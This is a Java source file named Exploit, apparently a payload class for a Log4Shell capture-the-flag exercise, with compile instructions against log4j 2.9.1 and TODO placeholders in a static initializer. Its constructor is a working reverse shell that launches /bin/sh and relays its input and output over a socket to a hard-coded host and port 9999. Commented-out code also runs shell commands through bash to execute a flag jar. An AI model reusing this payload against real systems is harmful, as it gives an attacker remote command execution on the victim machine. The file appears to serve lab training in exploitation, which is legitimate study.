/************************************************************************************* 
* To use the logger you must compile the class with (Run from Flagx Directory):
*
* javac -cp "../apache-log4j-2.9.1-bin/*" Exploit.java 
*
* The apache-log4j-2.9.1-bin folder is in the log4shell directory.
**************************************************************************************
*/

// import org.apache.logging.log4j.LogManager;
// import org.apache.logging.log4j.Logger;
import java.io.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit 
{
//	boolean isWindows = System.getProperty("os.name")
//			.toLowerCase().startsWith("windows");
	public Exploit() throws Exception{
	//	String homeDirectory = System.getProperty("user.home");
	//	String[] mycommand = new String[]{"bash", "-c", "java -jar ../../Flag2.jar"};
	//	Process process;
	//	process = Runtime.getRuntime().exec(mycommand);
	//	try{
	//		process.waitFor();
	//		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
	//		String line;
	//		while ((line = reader.readLine()) != null){
	//			System.out.println(line);
	//		}
	//	}
	//	catch(IOException e){
	//		e.printStackTrace();
	//	}
	//
		String host="0.0.0.0";
		int port=9999;
		String cmd="/bin/sh";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
		Socket s=new Socket(host, port);
		InputStream pi = p.getInputStream(),
			    pe = p.getInputStream(),
			    si = s.getInputStream();
		OutputStream po=p.getOutputStream(), so=s.getOutputStream();
		while(!s.isClosed()){
			while(pi.available()>0)
				so.write(pi.read());
			while(pe.available()>0)
				so.write(pe.read());
			while(si.available()>0)
				po.write(si.read());
			so.flush();
			po.flush();
			Thread.sleep(50);
			try{
				p.exitValue();
				break;
			}
			catch (Exception e){
			}
		};
		p.destroy();
		s.close();
	}
    static
    {
	try{
	String homeDirectory = System.getProperty("user.home");
	//Process process;
	//	process = Runtime.getRuntime().exec(new String[]{"bash", "-c", "ls /home"});
	
	ProcessBuilder pb = new ProcessBuilder("ls");



	//final Logger log = LogManager.getLogger(Exploit.class.getName());
	  //TODO: Your exploit code should go here.
	}
        catch(Exception e)
        {
		System.out.println("NONO");
          //TODO: It might be helpful here to add useful debugging info.
        }
    }
}
